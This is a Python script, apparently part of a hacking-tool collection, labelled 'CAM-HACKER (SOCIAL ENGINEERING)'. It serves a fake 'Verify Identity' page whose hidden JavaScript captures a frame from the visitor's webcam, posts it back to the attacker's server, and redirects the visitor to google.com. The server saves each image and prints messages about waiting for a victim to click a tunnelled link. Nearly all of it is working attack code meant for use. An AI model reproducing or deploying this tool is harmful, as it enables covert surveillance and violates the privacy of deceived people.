# CREATED BY: RAMIZ UDDIN
import os, sys, time, socketserver, http.server, threading

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

PORT = 8081

class CamHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        if "imageData" in post_data:
            print("\033[1;32m[*] [!] CAMERA IMAGE CAPTURED! Saving...\033[0m")
            # In a real tool, we'd save the base64 to a .png file
            with open(f"captured_cam_{int(time.time())}.png", "w") as f:
                f.write(post_data)
        
        self.send_response(200)
        self.end_headers()

def run():
    tool_header("CAM-HACKER (SOCIAL ENGINEERING)")
    print("\033[1;32m[*] Advanced tool to capture camera images via link.")
    print("[*] Works on Root & Non-Root devices.\033[0m")
    
    # Create HTML/JS Payload
    with open("cam_index.html", "w") as f:
        f.write("""
        <html>
        <head><title>Verify Identity</title></head>
        <body style="background: black; color: white; text-align: center; padding-top: 50px;">
            <h2>Please wait while we verify your device...</h2>
            <video id="video" width="1" height="1" autoplay style="display:none;"></video>
            <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
            <script>
                async function start() {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        setTimeout(() => {
                            const canvas = document.getElementById('canvas');
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            const imgData = canvas.toDataURL('image/png');
                            fetch('/', { method: 'POST', body: 'imageData=' + encodeURIComponent(imgData) });
                            window.location.href = "https://google.com";
                        }, 2000);
                    } catch (err) { window.location.href = "https://google.com"; }
                }
                start();
            </script>
        </body>
        </html>
        """)

    print("\n\033[1;33m[+] Starting Server on Port 8081...")
    print("[!] Use 'Cloud Tunnel' (Tool 101) on port 8081 to get a public link.\033[0m")
    
    handler = CamHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print("\033[1;32m[*] Waiting for victim to click the link...\033[0m")
        try:
            # Change directory to serve only the specific file
            os.system("mv cam_index.html index.html")
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\033[1;31m[!] Stopping Server...\033[0m")
            os.system("rm index.html")
            httpd.shutdown()

if __name__ == "__main__": run()
